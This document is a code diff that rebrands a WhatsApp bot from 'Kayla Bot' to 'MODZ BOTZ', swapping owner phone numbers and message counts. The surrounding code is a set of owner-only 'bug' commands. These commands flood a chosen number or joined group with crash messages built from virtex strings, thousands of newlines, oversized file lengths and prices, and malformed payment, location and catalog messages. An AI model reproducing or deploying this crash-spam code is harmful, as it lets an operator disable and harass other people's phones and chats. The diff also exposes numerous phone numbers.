@@ -2815,7 +2711,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "7091718154232528",
-"title": `Kayla Bot WhatsApp ${virus} ${virtex(prefix)}`,
+"title": `MODZ BOTZ WhatsApp ${virus} ${virtex(prefix)}`,
 "description": `${virus}${virtex(prefix)}`,
 "currencyCode": "IDR",
 "priceAmount1000": "100000000000000000",
@@ -2823,9 +2719,9 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6285807264974`
+"url": `https://wa.me/6283845409710`
 },
-"businessOwnerJid": "6285807264974@s.whatsapp.net",
+"businessOwnerJid": "6283845409710@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
 kayla.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -2836,16 +2732,16 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'kayloc':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"name": `Kayla Bot ${virus}${virtex(prefix)}`,
+"name": `MODZ BOTZ ${virus}${virtex(prefix)}`,
 "url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": `Kayla Bot ${virus}${virtex(prefix)}`,
+"caption": `MODZ BOTZ ${virus}${virtex(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 "mtype": "locationMessage"
@@ -2859,7 +2755,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'kaykontak':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendContact(m.chat, owner, lep)
 await sleep(1000)
@@ -2869,9 +2765,9 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'kayitem':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(m.chat, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(m.chat, `MODZ BOTZ ${virus}${virtex(prefix)}`, `MODZ BOTZ ${virus}${virtex(prefix)}`, `MODZ BOTZ ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -2879,7 +2775,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'kaystick':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
 }
@@ -2888,11 +2784,11 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'kaydoc':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(m.chat, { 
 document: ppnyauser, 
-fileName: `🔥 KAYLA BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
+fileName: `🔥 MODZ BOTZ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyauser, 
 fileLength: "999999999", 
@@ -2904,7 +2800,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'kayvn':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
 await sleep(1000)
@@ -2914,13 +2810,13 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'kayteks':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.relayMessage(m.chat, {
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `Kayla Bot ${virus}${virtex(prefix)}`, 
+text: `MODZ BOTZ ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -2933,7 +2829,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'santedpcparah': 
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Contoh ${command} 6281297970769`)
+if (!q) return reply(`Contoh ${command} 6283845409710`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
 let hdhe = await kayla.onWhatsApp(nmn)
@@ -2950,7 +2846,7 @@ santedgc(bygbt, mnm, sleep)
 break
 case 'santetpc':
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Contoh ${command} 6281297970769`)
+if (!q) return reply(`Contoh ${command} 6283845409710`)
 tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
 let kgdhwus = await kayla.onWhatsApp(tosend)
@@ -2995,13 +2891,13 @@ reply(`Sukses`)
 break
 case 'spambugvip':{
 if (!itsMeKayla) return reply(mess.owner)
-if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628362663622|5`)
+if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 6283845409710|5`)
 numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 let cekno = await kayla.onWhatsApp(numt)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (isNaN(jumlah)) return reply(`Harus berupa angka`)
-var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6285807264974@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
+var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6283845409710@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
 var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
 var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
@@ -3030,14 +2926,14 @@ if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 let kir = await kayla.groupAcceptInvite(result)
 kayla.relayMessage(kir, {
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `Kayla Bot ${virus}${virtex(prefix)}`, 
+text: `MODZ BOTZ ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -3053,12 +2949,12 @@ if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 let kir = await kayla.groupAcceptInvite(result)
 kayla.sendMessage(kir, { 
 document: ppnyauser, 
-fileName: `🔥 KAYLA BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
+fileName: `🔥 MODZ BOTZ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyauser, 
 mentions:[sender] }, {quoted:lep})
@@ -3072,7 +2968,7 @@ if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 let kir = await kayla.groupAcceptInvite(result)
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
@@ -3080,7 +2976,7 @@ var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"name": `Kayla Bot WhatsApp ${virus}`,
+"name": `MODZ BOTZ WhatsApp ${virus}`,
 "address": `Created By Kayla ${virtex(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -3477,7 +3373,6 @@ jpegThumbnail: ppnyauser,
 caption: `Nih Kak @${sender.split("@")[0]}`,
 fileLength: "999999999999",
 mentions: [sender],
-footer: `Powered By Kanna`,
 buttons: buttoons,
 headerType: 4,
 contextInfo: {
@@ -3489,8 +3384,8 @@ contextInfo: {
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": { url: yeha },
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }}
 }
 kayla.sendMessage(m.chat, buttonMessaage, { quoted: m })
@@ -3884,7 +3779,7 @@ kayla.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 } catch (err) {
 console.log(util.format(err))
 let e = String(err)
-kayla.sendMessage("6287705048235@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
+kayla.sendMessage("6283845409710@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
 contextInfo:{
 forwardingScore: 5, 
 isForwarded: true
